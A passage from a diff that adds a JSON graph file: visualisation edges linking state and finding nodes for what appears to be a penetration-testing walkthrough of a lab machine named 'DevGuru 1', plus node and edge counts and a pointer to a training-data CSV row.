+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:8.1",
+      "to": "state:DevGuru 1:r8:8",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:8",
+      "to": "state:DevGuru 1:r8:9",
+      "label": "9",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:9",
+      "to": "state:DevGuru 1:r8:9.1",
+      "label": "9.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:9.1",
+      "to": "state:DevGuru 1:r8:9.2",
+      "label": "9.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 40,
+    "total_edges": 53,
+    "state_nodes": 12,
+    "action_nodes": 14,
+    "finding_nodes": 14,
+    "ptt_items_parsed": 25
+  },
+  "csv_row_index": 320,
+  "source_csv": "training_data.csv"
+}
